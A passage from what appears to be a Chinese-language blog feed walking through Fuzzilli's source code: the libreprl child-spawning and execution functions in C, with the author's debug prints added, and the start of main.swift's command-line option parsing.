class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">reprl_spawn_child</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx)</span><br>&#123;<br>    <span class="hljs-comment">// This is also a good time to ensure the data channel backing files don&#x27;t grow too large.</span><br>    ftruncate(ctx-&gt;data_in-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    ftruncate(ctx-&gt;data_out-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) ftruncate(ctx-&gt;child_stdout-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) ftruncate(ctx-&gt;child_stderr-&gt;fd, REPRL_MAX_DATA_SIZE);<br>    <br>    <span class="hljs-type">int</span> crpipe[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;          <span class="hljs-comment">// control pipe child -&gt; reprl</span><br>    <span class="hljs-type">int</span> cwpipe[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;;          <span class="hljs-comment">// control pipe reprl -&gt; child</span><br><br>    <span class="hljs-keyword">if</span> (pipe(crpipe) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pipe(cwpipe) != <span class="hljs-number">0</span>) &#123;<br>        close(crpipe[<span class="hljs-number">0</span>]);<br>        close(crpipe[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    ctx-&gt;ctrl_in = crpipe[<span class="hljs-number">0</span>];<br>    ctx-&gt;ctrl_out = cwpipe[<span class="hljs-number">1</span>];<br>    fcntl(ctx-&gt;ctrl_in, F_SETFD, FD_CLOEXEC);<br>    fcntl(ctx-&gt;ctrl_out, F_SETFD, FD_CLOEXEC);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span><br>    <span class="hljs-comment">// Use vfork() on Linux as that considerably improves the fuzzer performance. See also https://github.com/googleprojectzero/fuzzilli/issues/174</span><br>    <span class="hljs-comment">// Due to vfork, the code executed in the child process *must not* modify any memory apart from its stack, as it will share the page table of its parent.</span><br>    <span class="hljs-type">pid_t</span> pid = vfork();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">pid_t</span> pid = fork();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (dup2(cwpipe[<span class="hljs-number">0</span>], REPRL_CHILD_CTRL_IN) &lt; <span class="hljs-number">0</span> ||<br>            dup2(crpipe[<span class="hljs-number">1</span>], REPRL_CHILD_CTRL_OUT) &lt; <span class="hljs-number">0</span> ||<br>            dup2(ctx-&gt;data_out-&gt;fd, REPRL_CHILD_DATA_IN) &lt; <span class="hljs-number">0</span> ||<br>            dup2(ctx-&gt;data_in-&gt;fd, REPRL_CHILD_DATA_OUT) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 failed in the child: %s\n&quot;</span>, strerror(errno));<br>            _exit(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// Unblock any blocked signals. It seems that libdispatch sometimes blocks delivery of certain signals.</span><br>        <span class="hljs-type">sigset_t</span> newset;<br>        sigemptyset(&amp;newset);<br>        <span class="hljs-keyword">if</span> (sigprocmask(SIG_SETMASK, &amp;newset, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;sigprocmask failed in the child: %s\n&quot;</span>, strerror(errno));<br>            _exit(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        close(cwpipe[<span class="hljs-number">0</span>]);<br>        close(crpipe[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-type">int</span> devnull = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>        dup2(devnull, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) dup2(ctx-&gt;child_stdout-&gt;fd, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">else</span> dup2(devnull, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) dup2(ctx-&gt;child_stderr-&gt;fd, <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">else</span> dup2(devnull, <span class="hljs-number">2</span>);<br>        close(devnull);<br>        <br>        <span class="hljs-comment">// close all other FDs. We try to use FD_CLOEXEC everywhere, but let&#x27;s be extra sure we don&#x27;t leak any fds to the child.</span><br>        <span class="hljs-type">int</span> tablesize = getdtablesize();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt; tablesize; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i == REPRL_CHILD_CTRL_IN || i == REPRL_CHILD_CTRL_OUT || i == REPRL_CHILD_DATA_IN || i == REPRL_CHILD_DATA_OUT) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            close(i);<br>        &#125;<br><br>        execve(ctx-&gt;argv[<span class="hljs-number">0</span>], ctx-&gt;argv, ctx-&gt;envp);<br>        <br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Failed to execute child process %s: %s\n&quot;</span>, ctx-&gt;argv[<span class="hljs-number">0</span>], strerror(errno));<br>        fflush(<span class="hljs-built_in">stderr</span>);<br>        _exit(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>    close(crpipe[<span class="hljs-number">1</span>]);<br>    close(cwpipe[<span class="hljs-number">0</span>]);<br>    <br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        close(ctx-&gt;ctrl_in);<br>        close(ctx-&gt;ctrl_out);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to fork: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    ctx-&gt;pid = pid;<br><br>    <span class="hljs-type">char</span> helo[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (read(ctx-&gt;ctrl_in, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Did not receive HELO message from child: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(helo, <span class="hljs-string">&quot;HELO&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Received invalid HELO message from child: %s&quot;</span>, helo);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (write(ctx-&gt;ctrl_out, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to send HELO reply message to child: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此再看下主要执行者，这里主要关注status，下面函数首先尝试从控制管道中读取信息。如果不成功，就用waitpid来获取对应的status值，这种情况往往对应JS引擎出现了crash。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_execute</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* script, <span class="hljs-type">uint64_t</span> script_length, <span class="hljs-type">uint64_t</span> timeout, <span class="hljs-type">uint64_t</span>* execution_time, <span class="hljs-type">int</span> fresh_instance)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!ctx-&gt;initialized) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;REPRL context is not initialized&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (script_length &gt; REPRL_MAX_DATA_SIZE) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Script too large&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Terminate any existing instance if requested.</span><br>    <span class="hljs-keyword">if</span> (fresh_instance &amp;&amp; ctx-&gt;pid) &#123;<br>        reprl_terminate_child(ctx);<br>    &#125;<br><br>    <span class="hljs-comment">// Reset file position so the child can simply read(2) and write(2) to these fds.</span><br>    lseek(ctx-&gt;data_out-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    lseek(ctx-&gt;data_in-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) &#123;<br>        lseek(ctx-&gt;child_stdout-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) &#123;<br>        lseek(ctx-&gt;child_stderr-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    &#125;<br>    <br>    <span class="hljs-comment">// Spawn a new instance if necessary.</span><br>    <span class="hljs-keyword">if</span> (!ctx-&gt;pid) &#123;<br>        <span class="hljs-type">int</span> r = reprl_spawn_child(ctx);<br>        <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-comment">// Copy the script to the data channel.</span><br>    <span class="hljs-built_in">memcpy</span>(ctx-&gt;data_out-&gt;mapping, script, script_length);<br><br>    <span class="hljs-comment">// Tell child to execute the script.</span><br>    <span class="hljs-keyword">if</span> (write(ctx-&gt;ctrl_out, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span> ||<br>        write(ctx-&gt;ctrl_out, &amp;script_length, <span class="hljs-number">8</span>) != <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-comment">// These can fail if the child unexpectedly terminated between executions.</span><br>        <span class="hljs-comment">// Check for that here to be able to provide a better error message.</span><br>        <span class="hljs-type">int</span> status;<br>        <span class="hljs-keyword">if</span> (waitpid(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid) &#123;<br>            reprl_child_terminated(ctx);<br>            <span class="hljs-keyword">if</span> (WIFEXITED(status)) &#123;<br>                <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child unexpectedly exited with status %i between executions&quot;</span>, WEXITSTATUS(status));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child unexpectedly terminated with signal %i between executions&quot;</span>, WTERMSIG(status));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to send command to child process: %s&quot;</span>, strerror(errno));<br>    &#125;<br><br>    <span class="hljs-comment">// Wait for child to finish execution (or crash).</span><br>    <span class="hljs-type">int</span> timeout_ms = timeout / <span class="hljs-number">1000</span>;<br>    <span class="hljs-type">uint64_t</span> start_time = current_usecs();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123;.fd = ctx-&gt;ctrl_in, .events = POLLIN, .revents = <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, timeout_ms);<br>    *execution_time = current_usecs() - start_time;<br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// Execution timed out. Kill child and return a timeout status.</span><br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// An error occurred.</span><br>        <span class="hljs-comment">// We expect all signal handlers to be installed with SA_RESTART, so receiving EINTR here is unexpected and thus also an error.</span><br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to poll: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <br>    <span class="hljs-comment">// Poll succeeded, so there must be something to read now (either the status or EOF).</span><br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">ssize_t</span> rv = read(ctx-&gt;ctrl_in, &amp;status, <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to read from control pipe: %s&quot;</span>, strerror(errno));<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rv != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-comment">// Most likely, the child process crashed and closed the write end of the control pipe.</span><br>        <span class="hljs-comment">// Unfortunately, there probably is nothing that guarantees that waitpid() will immediately succeed now,</span><br>        <span class="hljs-comment">// and we also don&#x27;t want to block here. So just retry waitpid() a few times...</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-line419-for testing asan check\n&quot;</span>);<br>        <span class="hljs-type">int</span> success = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            success = waitpid(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid;<br>            <span class="hljs-keyword">if</span> (!success) usleep(<span class="hljs-number">10</span>);<br>        &#125; <span class="hljs-keyword">while</span> (!success &amp;&amp; current_usecs() - start_time &lt; timeout);<br>        <br>        <span class="hljs-keyword">if</span> (!success) &#123;<br>            <span class="hljs-comment">// Wait failed, so something weird must have happened. Maybe somehow the control pipe was closed without the child exiting?</span><br>            <span class="hljs-comment">// Probably the best we can do is kill the child and return an error.</span><br>            reprl_terminate_child(ctx);<br>            <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Child in weird state after execution&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-line432-for testing status value: %d\n&quot;</span>, status);<br>        <span class="hljs-comment">// Cleanup any state related to this child process.</span><br>        reprl_child_terminated(ctx);<br><br>        <span class="hljs-keyword">if</span> (WIFEXITED(status)) &#123;<br>            status = WEXITSTATUS(status) &lt;&lt; <span class="hljs-number">8</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br>            status = WTERMSIG(status);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// This shouldn&#x27;t happen, since we don&#x27;t specify WUNTRACED for waitpid...</span><br>            <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Waitpid returned unexpected child state %i&quot;</span>, status);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// The status must be a positive number, see the status encoding format below.</span><br>    <span class="hljs-comment">// We also don&#x27;t allow the child process to indicate a timeout. If we wanted,</span><br>    <span class="hljs-comment">// we could treat it as an error if the upper bits are set.</span><br>    <span class="hljs-comment">//jy add</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libreprl-djy-status:%d\n&quot;</span>, status);<br>    <br>    status &amp;= <span class="hljs-number">0xffff</span>;<br><br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzilli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzilli源码解析1</title>
    <link href="/2024/05/01/Fuzzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%901/"/>
    <url>/2024/05/01/Fuzzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%901/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzilli源码解析1–main-swift"><a href="#Fuzzilli源码解析1–main-swift" class="headerlink" title="Fuzzilli源码解析1–main.swift"></a>Fuzzilli源码解析1–main.swift</h1><h2 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h2><p>从main.swift看起，首先就是命令行参数解析：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Process commandline arguments.</span><br><span class="hljs-comment">//</span><br><span class="hljs-keyword">let</span> args <span class="hljs-operator">=</span> <span class="hljs-type">Arguments</span>.parse(from: <span class="hljs-type">CommandLine</span>.arguments)<br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&quot;-h&quot;</span>] <span class="hljs-operator">!=</span> <span class="hljs-literal">nil</span> <span class="hljs-operator">||</span> args[<span class="hljs-string">&quot;--help&quot;</span>] <span class="hljs-operator">!=</span> <span class="hljs-literal">nil</span> <span class="hljs-operator">||</span> args.numPositionalArguments <span class="hljs-operator">!=</span> <span class="hljs-number">1</span> &#123;<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Usage:</span><br><span class="hljs-string"><span class="hljs-subst">\(args.programName)</span> [options] --profile=&lt;profile&gt; /path/to/jsshell</span><br><span class="hljs-string"></span><br><span class="hljs-string">Options:</span><br><span class="hljs-string">    --profile=name               : Select one of several preconfigured profiles.</span><br><span class="hljs-string">                                   Available profiles: <span class="hljs-subst">\(profiles.keys)</span>.</span><br><span class="hljs-string">    --jobs=n                     : Total number of fuzzing jobs. This will start one master thread and n-1 worker threads.</span><br><span class="hljs-string">    --engine=name                : The fuzzing engine to use. Available engines: &quot;mutation&quot; (default), &quot;hybrid&quot;, &quot;multi&quot;.</span><br><span class="hljs-string">                                   Only the mutation engine should be regarded stable at this point.</span><br><span class="hljs-string">    --corpus=name                : The corpus scheduler to use. Available schedulers: &quot;basic&quot; (default), &quot;markov&quot;</span><br><span class="hljs-string">    --logLevel=level             : The log level to use. Valid values: &quot;verbose&quot;, info&quot;, &quot;warning&quot;, &quot;error&quot;, &quot;fatal&quot; (default: &quot;info&quot;).</span><br><span class="hljs-string">    --numIterations=n            : Run for the specified number of iterations (default: unlimited).</span><br><span class="hljs-string">    --timeout=n                  : Timeout in ms after which to interrupt execution of programs (default: 250).</span><br><span class="hljs-string">    --minMutationsPerSample=n    : Discard samples from the corpus only after they have been mutated at least this many times (default: 25).</span><br><span class="hljs-string">    --minCorpusSize=n            : Keep at least this many samples in the corpus regardless of the number of times</span><br><span class="hljs-string">                                   they have been mutated (default: 1000).</span><br><span class="hljs-string">    --maxCorpusSize=n            : Only allow the corpus to grow to this many samples. Otherwise the oldest samples</span><br><span class="hljs-string">                                   will be discarded (default: unlimited).</span><br><span class="hljs-string">    --markovDropoutRate=p        : Rate at which low edge samples are not selected, in the Markov Corpus Scheduler,</span><br><span class="hljs-string">                                   per round of sample selection. Used to ensure diversity between fuzzer instances</span><br><span class="hljs-string">                                   (default: 0.10)</span><br><span class="hljs-string">    --consecutiveMutations=n     : Perform this many consecutive mutations on each sample (default: 5).</span><br><span class="hljs-string">    --minimizationLimit=p        : When minimizing interesting programs, keep at least this percentage of the original instructions</span><br><span class="hljs-string">                                   regardless of whether they are needed to trigger the interesting behaviour or not.</span><br><span class="hljs-string">                                   See Minimizer.swift for an overview of this feature (default: 0.0).</span><br><span class="hljs-string">    --storagePath=path           : Path at which to store output files (crashes, corpus, etc.) to.</span><br><span class="hljs-string">    --resume                     : If storage path exists, import the programs from the corpus/ subdirectory</span><br><span class="hljs-string">    --overwrite                  : If storage path exists, delete all data in it and start a fresh fuzzing session</span><br><span class="hljs-string">    --exportStatistics           : If enabled, fuzzing statistics will be collected and saved to disk in regular intervals.</span><br><span class="hljs-string">                                   Requires --storagePath.</span><br><span class="hljs-string">    --statisticsExportInterval=n : Interval in minutes for saving fuzzing statistics to disk (default: 10).</span><br><span class="hljs-string">                                   Requires --exportStatistics.</span><br><span class="hljs-string">    --importCorpusAll=path       : Imports a corpus of protobufs to start the initial fuzzing corpus.</span><br><span class="hljs-string">                                   All provided programs are included, even if they do not increase coverage.</span><br><span class="hljs-string">                                   This is useful for searching for variants of existing bugs.</span><br><span class="hljs-string">                                   Can be used alongside with importCorpusNewCov, and will run first</span><br><span class="hljs-string">    --importCorpusNewCov=path    : Imports a corpus of protobufs to start the initial fuzzing corpus.</span><br><span class="hljs-string">                                   This only includes programs that increase coverage.</span><br><span class="hljs-string">                                   This is useful for jump starting coverage for a wide range of JavaScript samples.</span><br><span class="hljs-string">                                   Can be used alongside importCorpusAll, and will run second.</span><br><span class="hljs-string">                                   Since all imported samples are asynchronously minimized, the corpus will show a smaller</span><br><span class="hljs-string">                                   than expected size until minimization completes.</span><br><span class="hljs-string">    --importCorpusMerge=path     : Imports a corpus of protobufs to start the initial fuzzing corpus.</span><br><span class="hljs-string">                                   This only keeps programs that increase coverage but does not attempt to minimize</span><br><span class="hljs-string">                                   the samples. This is mostly useful to merge existing corpora from previous fuzzing</span><br><span class="hljs-string">                                   sessions that will have redundant samples but which will already be minimized.</span><br><span class="hljs-string">    --instanceType=type          : Specified the instance type for distributed fuzzing. Possible values:</span><br><span class="hljs-string">                                                     master: Accept connections from workers over the network.</span><br><span class="hljs-string">                                                     worker: Connect to a master instance and synchronize with it.</span><br><span class="hljs-string">                                               intermediate: Run as both network master and worker.</span><br><span class="hljs-string">                                       standalone (default): Don&#x27;t participate in distributed fuzzing.</span><br><span class="hljs-string">                                   Note: it is *highly* recommended to run distributed fuzzing in an isolated network!</span><br><span class="hljs-string">    --bindTo=host:port           : When running as network master, bind to this address (default: 127.0.0.1:1337).</span><br><span class="hljs-string">    --connectTo=host:port        : When running as network worker, connect to the master instance at this address (default: 127.0.0.1:1337).</span><br><span class="hljs-string">    --corpusSyncMode=mode        : How the corpus is synchronized during distributed fuzzing. Possible values:</span><br><span class="hljs-string">                                                  up: newly discovered corpus samples are only sent to master instances but</span><br><span class="hljs-string">                                                      not to workers. This way, the workers are forced to generate their own</span><br><span class="hljs-string">                                                      corpus, which may lead to more diverse samples overall. However, master</span><br><span class="hljs-string">                                                      instances will still have the full XYZ</span><br><span class="hljs-string">                                                down: newly discovered corpus samples are only sent to worker instances but</span><br><span class="hljs-string">                                                      not to masters. This may make sense when importing a corpus in the master</span><br><span class="hljs-string">                                      full (default): newly discovered corpus samples are sent in both direction. This is the</span><br><span class="hljs-string">                                                      default behaviour and will generally cause all instances in the network</span><br><span class="hljs-string">                                                      to have very roughly the same corpus.</span><br><span class="hljs-string">                                               none : corpus samples are not shared with any other instances in the network.</span><br><span class="hljs-string">                                   Note: thread workers (--jobs=X) always synchronize their corpus.</span><br><span class="hljs-string">    --dontFuzz                   : If used, this instace will not perform fuzzing. Can be useful for master instances.</span><br><span class="hljs-string">    --diagnostics                : Enable saving of programs that failed or timed-out during execution. Also tracks</span><br><span class="hljs-string">                                   executions on the current REPRL instance.</span><br><span class="hljs-string">    --swarmTesting               : Enable Swarm Testing mode. The fuzzer will choose random weights for the code generators per process.</span><br><span class="hljs-string">    --inspect=opt1,opt2,...      : Enable inspection options. The following options are currently available:</span><br><span class="hljs-string">                                       history: Additional .fuzzil.history files are written to disk for every program.</span><br><span class="hljs-string">                                                These describe in detail how the program was generated through mutations,</span><br><span class="hljs-string">                                                code generation, and minimization</span><br><span class="hljs-string">    --argumentRandomization      : Enable JS engine argument randomization</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面就是获取js引擎的路径和profile的类型</p><figure class="highlight 